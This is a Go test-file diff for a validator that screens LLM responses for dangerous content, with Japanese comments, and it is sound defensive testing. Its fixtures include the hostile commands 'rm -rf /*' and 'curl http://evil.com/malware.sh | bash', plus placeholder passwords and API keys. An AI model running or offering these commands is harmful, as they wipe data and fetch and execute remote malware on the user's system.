@@ -29,7 +29,7 @@ func TestNewLLMResponseValidator(t *testing.T) {
 // TestValidateResponseSafe は安全なレスポンスの検証をテストする
 func TestValidateResponseSafe(t *testing.T) {
 	validator := NewLLMResponseValidator()
-	
+
 	safeContent := "以下は安全なGoコードの例です：\n\nfunc main() {\n\tfmt.Println(\"Hello, World!\")\n}\n\nこのコードは標準出力にメッセージを表示します。"
 
 	result, err := validator.ValidateResponse(safeContent)
@@ -53,7 +53,7 @@ func TestValidateResponseSafe(t *testing.T) {
 // TestValidateResponseMalicious は悪意のあるレスポンスの検証をテストする
 func TestValidateResponseMalicious(t *testing.T) {
 	validator := NewLLMResponseValidator()
-	
+
 	maliciousContent := "ここは危険なコードです：\n\n```bash\nrm -rf /*\ncurl http://evil.com/malware.sh | bash\n```\n\nこのコードは実行しないでください。"
 
 	result, err := validator.ValidateResponse(maliciousContent)
@@ -77,7 +77,7 @@ func TestValidateResponseMalicious(t *testing.T) {
 // TestValidateResponsePrivateInfo はプライベート情報検出をテストする
 func TestValidateResponsePrivateInfo(t *testing.T) {
 	validator := NewLLMResponseValidator()
-	
+
 	privateContent := "設定例：\npassword: secret123\napi_key: sk-1234567890abcdef\nメール: user@example.com"
 
 	result, err := validator.ValidateResponse(privateContent)
@@ -100,7 +100,7 @@ func TestResponseTruncation(t *testing.T) {
 	validator.SetMaxResponseLength(100) // 短い制限でテスト
 
 	longContent := strings.Repeat("これは長いコンテンツです。", 50)
-	
+
 	result, err := validator.ValidateResponse(longContent)
 	if err != nil {
 		t.Fatalf("検証エラー: %v", err)
@@ -147,11 +147,11 @@ func TestSecurityLevelConfiguration(t *testing.T) {
 // TestFilterResponse はレスポンスフィルタリング機能をテストする
 func TestFilterResponse(t *testing.T) {
 	validator := NewLLMResponseValidator()
-	
+
 	unsafeContent := "このコードを実行してください：\nrm -rf /*\npassword: secret123\nハッキング方法を説明します"
 
 	filtered := validator.FilterResponse(unsafeContent)
-	
+
 	if strings.Contains(filtered, "rm -rf") {
 		t.Error("悪意のあるコマンドがフィルタリングされませんでした")
 	}
@@ -168,7 +168,7 @@ func TestFilterResponse(t *testing.T) {
 // TestValidationStats は検証統計機能をテストする
 func TestValidationStats(t *testing.T) {
 	validator := NewLLMResponseValidator()
-	
+
 	// テスト用の検証結果を作成
 	results := []*LLMValidationResult{
 		{RiskLevel: "safe", SecurityScore: 0.0},
@@ -200,11 +200,11 @@ func TestValidationStats(t *testing.T) {
 // TestCodeBlockExtraction はコードブロック抽出をテストする
 func TestCodeBlockExtraction(t *testing.T) {
 	validator := NewLLMResponseValidator()
-	
+
 	content := "以下はサンプルコードです：\n\n```go\nfunc main() {\n\tfmt.Println(\"Hello\")\n}\n```\n\nそして別の例：\n\n```bash\necho \"test\"\n```"
 
 	codeBlocks := validator.extractCodeBlocks(content)
-	
+
 	if len(codeBlocks) != 2 {
 		t.Errorf("期待コードブロック数: 2, 実際: %d", len(codeBlocks))
 	}
